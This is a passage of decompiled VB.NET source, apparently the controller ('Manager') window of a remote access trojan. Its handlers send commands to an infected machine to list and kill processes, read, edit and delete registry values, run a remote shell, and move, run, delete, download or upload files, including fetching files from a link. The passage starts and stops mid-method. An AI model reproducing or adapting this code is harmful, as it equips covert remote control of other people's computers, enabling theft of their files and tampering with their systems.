			End If
		End Sub

		' Token: 0x0600024D RID: 589 RVA: 0x00014650 File Offset: 0x00012850
		Private Sub Manager_Load(sender As Object, e As EventArgs)
			Try
				Me.LPR.Tag = Nothing
				Me.LTCP.Tag = Nothing
				Me.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT")
				Me.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER")
				Me.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE")
				Me.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS")
				Me.L2.Controls.Add(Me.p)
				Me.ListView1.Items(0).Selected = True
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "~" }))
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
				Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.sk.L)))
				Me.L2.Controls.Add(Me.p)
				Me.p.Visible = False
				Try
					Me.string_0 = Me.sk.Folder + "Downloads\"
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600024E RID: 590 RVA: 0x00014858 File Offset: 0x00012A58
		Private Sub Manager_Resize(sender As Object, e As EventArgs)
			Me.p.Left = Me.L2.Width - Me.p.Width - 25
			Me.p.Top = Me.L2.Height - Me.p.Height - 25
		End Sub

		' Token: 0x0600024F RID: 591 RVA: 0x000148B4 File Offset: 0x00012AB4
		Private Sub KillToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = text + Class7.string_1 + listViewItem.SubItems(1).Text
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Dim flag2 As Boolean = text.Length > 0
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "k", text }))
			End If
		End Sub

		' Token: 0x06000250 RID: 592 RVA: 0x00014998 File Offset: 0x00012B98
		Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText })
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Dim flag2 As Boolean = text.Length > 0
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "kd", text }))
			End If
		End Sub

		' Token: 0x06000251 RID: 593 RVA: 0x00014A9C File Offset: 0x00012C9C
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.TextBox1.Text.Length > 0
			If flag Then
				Me.exp(Me.TextBox1.Text, True)
			End If
		End Sub

		' Token: 0x06000252 RID: 594 RVA: 0x00014AD6 File Offset: 0x00012CD6
		Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e)
		End Sub

		' Token: 0x06000253 RID: 595 RVA: 0x00014AEC File Offset: 0x00012CEC
		Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGLIST.SelectedItems.Count <> 0
			If flag Then
				Dim listViewItem As ListViewItem = Me.RGLIST.SelectedItems(0)
				Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
				rgv.TextBox1.Text = listViewItem.Text
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems(1).Text)
				Try
					rgv.TextBox3.Text = listViewItem.SubItems(2).Text
				Catch ex As Exception
				End Try
				rgv.Text = rgv.Path
				rgv.TextBox1.[ReadOnly] = True
				rgv.ShowDialog(Me)
			End If
		End Sub

		' Token: 0x06000254 RID: 596 RVA: 0x00014BFC File Offset: 0x00012DFC
		Private Sub NewValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
			rgv.TextBox1.Text = "Name"
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String")
			rgv.TextBox3.Text = "Value"
			rgv.Text = rgv.Path
			rgv.ShowDialog(Me)
		End Sub

		' Token: 0x06000255 RID: 597 RVA: 0x00014C94 File Offset: 0x00012E94
		Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.RGLIST.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, listViewItem.Text }))
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000256 RID: 598 RVA: 0x00014D78 File Offset: 0x00012F78
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			If keyCode <> Keys.[Return] Then
				If keyCode <> Keys.Up Then
					If keyCode = Keys.Down Then
						Me.int_0 += -1
						Dim flag As Boolean = Me.int_0 < 0
						If flag Then
							Me.int_0 = 0
						End If
						Me.T2.Text = Me.string_1(Me.int_0)
					End If
				Else
					Dim ptr As Integer = Me.int_0
					Me.int_0 = ptr + 1
					Dim flag2 As Boolean = Me.int_0 > Me.string_1.Length - 1
					If flag2 Then
						Me.int_0 = Me.string_1.Length - 1
					End If
					Me.T2.Text = Me.string_1(Me.int_0)
				End If
			Else
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Dim ptr As Integer = Me.int_1
				Me.int_1 = ptr + 1
				Dim flag3 As Boolean = Me.int_1 > Me.string_1.Length - 1
				If flag3 Then
					Me.int_1 = 0
				End If
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
			End If
		End Sub

		' Token: 0x06000257 RID: 599 RVA: 0x00014EF8 File Offset: 0x000130F8
		Private Sub sh_Resize(sender As Object, e As EventArgs)
			Me.T1.ScrollToCaret()
		End Sub

		' Token: 0x06000258 RID: 600 RVA: 0x00014F08 File Offset: 0x00013108
		Private Sub RGk_AfterCollapse(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			Dim flag2 As Boolean = gclass Is Nothing
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Dim flag3 As Boolean = gclass.list_0.Count = 0 And gclass.list_1.Count = 0
				If flag3 Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							Dim flag4 As Boolean = Operators.CompareString(array(1), "String", False) = 0
							If flag4 Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
				End If
			End If
		End Sub

		' Token: 0x06000259 RID: 601 RVA: 0x00015154 File Offset: 0x00013354
		Private Sub RGk_AfterExpand(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			Dim flag2 As Boolean = gclass Is Nothing
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Dim flag3 As Boolean = gclass.list_0.Count = 0 And gclass.list_1.Count = 0
				If flag3 Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							Dim flag4 As Boolean = Operators.CompareString(array(1), "String", False) = 0
							If flag4 Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
				End If
			End If
		End Sub

		' Token: 0x0600025A RID: 602 RVA: 0x000153A0 File Offset: 0x000135A0
		Private Sub RGk_AfterSelect(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			Dim flag2 As Boolean = gclass Is Nothing
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				Dim flag3 As Boolean = gclass.list_0.Count = 0 And gclass.list_1.Count = 0
				If flag3 Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							Dim flag4 As Boolean = Operators.CompareString(array(1), "String", False) = 0
							If flag4 Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
					Dim flag5 As Boolean = Not e.Node.IsExpanded
					If flag5 Then
						e.Node.Expand()
					End If
				End If
			End If
		End Sub

		' Token: 0x0600025B RID: 603 RVA: 0x0001560C File Offset: 0x0001380C
		Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText, "::", listViewItem.SubItems(4).Text })
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Dim flag2 As Boolean = text.Length > 0
			If flag2 Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "re", text }))
			End If
		End Sub

		' Token: 0x0600025C RID: 604 RVA: 0x0001572C File Offset: 0x0001392C
		Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x0600025D RID: 605 RVA: 0x000157CC File Offset: 0x000139CC
		Private Sub L2_DoubleClick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.L2.SelectedItems(0).SubItems(2).Text, "DIR", False) = 0
				If flag2 Then
					Me.exp(Me.L2.SelectedItems(0).ToolTipText, False)
				Else
					Dim array As String() = New String(6) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "rd"
					array(5) = Class7.string_1
					Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
					Dim toolTipText As String = listViewItem.ToolTipText
					listViewItem.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x0600025E RID: 606 RVA: 0x000158C4 File Offset: 0x00013AC4
		Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.p.Image = Nothing
			Me.p.Visible = False
			Dim flag As Boolean = Me.L2.SelectedItems.Count = 1
			If flag Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				Dim flag2 As Boolean = Me.Images.Contains(listViewItem.ToolTipText)
				If flag2 Then
					Me.p.Image = CType(Me.Images(listViewItem.ToolTipText), Image)
					Me.p.Visible = True
				Else
					Dim flag3 As Boolean = listViewItem.SubItems(2).Text.Length > 0 AndAlso ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems(2).Text.ToLower())
					If flag3 Then
						Dim array As String() = New String(10) {}
						array(0) = "Ex"
						array(1) = Class7.string_1
						array(2) = "fm"
						array(3) = Class7.string_1
						array(4) = "#"
						array(5) = Class7.string_1
						Dim listViewItem2 As ListViewItem = listViewItem
						Dim toolTipText As String = listViewItem2.ToolTipText
						listViewItem2.ToolTipText = toolTipText
						array(6) = Class6.smethod_14(toolTipText)
						array(7) = Class7.string_1
						array(8) = Conversions.ToString(Me.p.Width)
						array(9) = Class7.string_1
						array(10) = Conversions.ToString(Me.p.Height)
						Me.sk.Send(String.Concat(array))
					End If
				End If
			End If
		End Sub

		' Token: 0x0600025F RID: 607 RVA: 0x00015A58 File Offset: 0x00013C58
		Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.Items.ContainsKey("..")
			If flag Then
				Me.exp(Me.L2.Items("..").ToolTipText, False)
			End If
		End Sub

		' Token: 0x06000260 RID: 608 RVA: 0x00015AA4 File Offset: 0x00013CA4
		Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rn" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim toolTipText As String = listViewItem.ToolTipText
						listViewItem.ToolTipText = toolTipText
						text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x06000261 RID: 609 RVA: 0x00015B94 File Offset: 0x00013D94
		Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count <= 0
				If Not flag Then
					Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1 })
					Try
						Try
							For Each obj As Object In Me.L2.SelectedItems
								Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
								Dim flag2 As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0
								If flag2 Then
									Dim flag3 As Boolean = Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0
									If flag3 Then
										Dim str As String = text
										Dim str2 As String = Class7.string_1
										Dim text2 As String = listViewItem.ToolTipText + "*!"
										Dim str3 As String = Class6.smethod_14(text2)
										text = str + str2 + str3
									Else
										Dim str4 As String = text
										Dim str5 As String = Class7.string_1
										Dim text3 As String = listViewItem.ToolTipText + "*"
										Dim str6 As String = Class6.smethod_14(text3)
										text = str4 + str5 + str6
									End If
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					Finally
						Dim enumerator2 As IEnumerator
						Dim flag4 As Boolean = TypeOf enumerator2 Is IDisposable
						If flag4 Then
							TryCast(enumerator2, IDisposable).Dispose()
						End If
					End Try
					Me.sk.Send(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000262 RID: 610 RVA: 0x00015D84 File Offset: 0x00013F84
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0
					If flag Then
						Dim flag2 As Boolean = Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0
						If flag2 Then
							Dim text As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							Dim flag3 As Boolean = text.Length > 0
							If flag3 Then
								Dim client As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim num As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text + "*!"
								array(num) = Class6.smethod_14(text2)
								client.Send(String.Concat(array))
							End If
						Else
							Dim text3 As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							Dim flag4 As Boolean = text3.Length > 0
							If flag4 Then
								Dim client2 As Client = Me.sk
								Dim array2 As String() = New String(6) {}
								array2(0) = "Ex"
								array2(1) = Class7.string_1
								array2(2) = "fm"
								array2(3) = Class7.string_1
								array2(4) = "nm"
								array2(5) = Class7.string_1
								Dim num2 As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text3 + "*"
								array2(num2) = Class6.smethod_14(text2)
								client2.Send(String.Concat(array2))
							End If
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag5 As Boolean = TypeOf enumerator Is IDisposable
				If flag5 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000263 RID: 611 RVA: 0x00015F78 File Offset: 0x00014178
		Private Sub SL_Click(sender As Object, e As EventArgs)
			Me.SL.Text = String.Empty
		End Sub

		' Token: 0x06000264 RID: 612 RVA: 0x00015F8C File Offset: 0x0001418C
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
				If flag2 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Dim flag3 As Boolean = Operators.CompareString(text, String.Empty, False) <> 0
			If flag3 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = False
			End If
		End Sub

		' Token: 0x06000265 RID: 613 RVA: 0x00016078 File Offset: 0x00014278
		Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
				If flag2 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Dim flag3 As Boolean = Operators.CompareString(text, String.Empty, False) <> 0
			If flag3 Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = True
			End If
		End Sub

		' Token: 0x06000266 RID: 614 RVA: 0x00016164 File Offset: 0x00014364
		Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Flist, String.Empty, False) <> 0
			If flag Then
				Dim flag2 As Boolean = Me.isCut
				If flag2 Then
					Dim client As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "mv"
					array(5) = Class7.string_1
					Dim num As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array(num) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client.Send(String.Concat(array))
				Else
					Dim client2 As Client = Me.sk
					Dim array2 As String() = New String(8) {}
					array2(0) = "Ex"
					array2(1) = Class7.string_1
					array2(2) = "fm"
					array2(3) = Class7.string_1
					array2(4) = "cp"
					array2(5) = Class7.string_1
					Dim num2 As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array2(num2) = Class6.smethod_14(text)
					array2(7) = Class7.string_1
					array2(8) = Class6.smethod_14(Me.Flist)
					client2.Send(String.Concat(array2))
				End If
			End If
		End Sub

		' Token: 0x06000267 RID: 615 RVA: 0x000162C0 File Offset: 0x000144C0
		Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0
					If flag Then
						Dim array As String() = New String(8) {}
						array(0) = "Ex"
						array(1) = Class7.string_1
						array(2) = "fm"
						array(3) = Class7.string_1
						array(4) = "dw"
						array(5) = Class7.string_1
						Dim listViewItem2 As ListViewItem = listViewItem
						Dim toolTipText As String = listViewItem2.ToolTipText
						listViewItem2.ToolTipText = toolTipText
						array(6) = Class6.smethod_14(toolTipText)
						array(7) = Class7.string_1
						array(8) = Me.sk.ip()
						Me.sk.Send(String.Concat(array))
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
				If flag2 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000268 RID: 616 RVA: 0x000163F4 File Offset: 0x000145F4
		Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.Items.Count = 0
				If Not flag Then
					Dim text As String = Me.TextBox1.Text
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.FileName = String.Empty
					openFileDialog.Multiselect = True
					Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag2 Then
						Dim fileNames As String() = openFileDialog.FileNames
						Dim num As Integer = fileNames.Length - 1
						For i As Integer = 0 To num
							Dim text2 As String = fileNames(i)
							Dim flag3 As Boolean = FileSystem.FileLen(text2) <> 0L
							If flag3 Then
								Dim up As up = New up()
								up.TMP = text2
								up.FN = (text + "\" + New FileInfo(text2).Name).Replace("\\", "\")
								up.Name = Me.sk.ip() + Class6.smethod_14(up.FN)
								up.osk = Me.sk
								up.SZ = CInt(FileSystem.FileLen(up.TMP))
								up.Text = New FileInfo(up.TMP).Name + " >> " + up.FN
								up.Show()
							End If
						Next
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000269 RID: 617 RVA: 0x00016580 File Offset: 0x00014780
		Private Sub NewEmptyFileToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
			Dim flag As Boolean = text.Length <> 0
			If flag Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nf"
				array(5) = Class7.string_1
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x0600026A RID: 618 RVA: 0x00016618 File Offset: 0x00014818
		Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
			Dim flag As Boolean = text.Length <> 0
			If flag Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nd"
				array(5) = Class7.string_1
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x0600026B RID: 619 RVA: 0x000166B0 File Offset: 0x000148B0
		Private Sub OpenDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Directory.Exists(Me.string_0)
			If flag Then
				Directory.CreateDirectory(Me.string_0)
			End If
			Try
				Process.Start(Me.string_0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600026C RID: 620 RVA: 0x00016710 File Offset: 0x00014910
		Private Sub RarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rar", Class7.string_1 })
				Dim text2 As String = Interaction.InputBox("Enter Rar Name", String.Empty, New DirectoryInfo(Me.TextBox1.Text).Name + ".rar", -1, -1)
				Dim flag2 As Boolean = Operators.CompareString(text2, String.Empty, False) <> 0
				If flag2 Then
					Dim textBox As TextBox = Me.TextBox1
					Dim text3 As String = textBox.Text
					textBox.Text = text3
					text = String.Concat(New String() { text, Class6.smethod_14(text2), Class7.string_1, Class6.smethod_14(text3), Class7.string_1 })
					Dim str As String = "a -y """ + text2 + """"
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							str = str + " """ + listViewItem.Text + """"
						Next
					Finally
						Dim enumerator As IEnumerator
						Dim flag3 As Boolean = TypeOf enumerator Is IDisposable
						If flag3 Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					text += Class6.smethod_14(str)
					Me.sk.Send(text)
				End If
			End If
		End Sub

		' Token: 0x0600026D RID: 621 RVA: 0x000168BC File Offset: 0x00014ABC
		Private Sub UnRarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				Dim toolTipText As String = listViewItem.ToolTipText
				listViewItem.ToolTipText = toolTipText
				Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "unrar", Class7.string_1, Class6.smethod_14(toolTipText) })
				Me.sk.Send(s)
			End If
		End Sub

		' Token: 0x0600026E RID: 622 RVA: 0x00016958 File Offset: 0x00014B58
		Private Sub UploadFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, String.Empty, False) <> 0
			If flag Then
				Dim fromLink As FromLink = New FromLink()
				fromLink.ShowDialog(Me)
				Dim isOK As Boolean = fromLink.IsOK
				If isOK Then
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "fl"
					array(5) = Class7.string_1
					Dim textBox As TextBox = fromLink.TextBox1
					Dim text As String = textBox.Text
					textBox.Text = text
					array(6) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 8
					Dim text2 As String = Me.TextBox1.Text + fromLink.TextBox2.Text
					array2(num) = Class6.smethod_14(text2)
